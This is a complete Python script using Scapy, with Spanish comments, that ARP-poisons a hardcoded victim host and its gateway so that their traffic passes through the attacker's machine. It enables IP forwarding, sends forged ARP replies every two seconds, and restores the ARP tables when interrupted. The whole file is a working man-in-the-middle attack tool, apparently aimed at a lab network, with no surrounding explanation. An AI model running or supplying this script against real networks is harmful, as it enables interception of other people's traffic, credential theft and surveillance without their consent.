#!/usr/bin/env python3
from scapy.all import *
import time

VICTIMA_IP  = "10.11.85.20"
GATEWAY_IP  = "10.11.85.1"
IFACE       = "eth0"

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 timeout=2, iface=IFACE, verbose=False)
    return ans[0][1].hwsrc if ans else None

def poison(victima_ip, gateway_ip, victima_mac, gateway_mac):
    # Le dice a la víctima que el gateway somos nosotros
    send(ARP(op=2, pdst=victima_ip, hwdst=victima_mac,
             psrc=gateway_ip), iface=IFACE, verbose=False)
    # Le dice al gateway que la víctima somos nosotros
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
             psrc=victima_ip), iface=IFACE, verbose=False)

def restore(victima_ip, gateway_ip, victima_mac, gateway_mac):
    send(ARP(op=2, pdst=victima_ip, hwdst=victima_mac,
             psrc=gateway_ip, hwsrc=gateway_mac), count=4, iface=IFACE, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
             psrc=victima_ip, hwsrc=victima_mac), count=4, iface=IFACE, verbose=False)

print("[*] Obteniendo MACs...")
victima_mac = get_mac(VICTIMA_IP)
gateway_mac = get_mac(GATEWAY_IP)

if not victima_mac or not gateway_mac:
    print("[!] No se pudo obtener MAC. Verifica conectividad.")
    exit(1)

print(f"[*] Víctima MAC : {victima_mac}")
print(f"[*] Gateway MAC : {gateway_mac}")

# Habilitar IP forwarding
import os
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print("[*] IP forwarding activado")
print("[*] Envenenando ARP... Ctrl+C para detener\n")

try:
    while True:
        poison(VICTIMA_IP, GATEWAY_IP, victima_mac, gateway_mac)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] Restaurando ARP...")
    restore(VICTIMA_IP, GATEWAY_IP, victima_mac, gateway_mac)
    print("[*] Listo.")
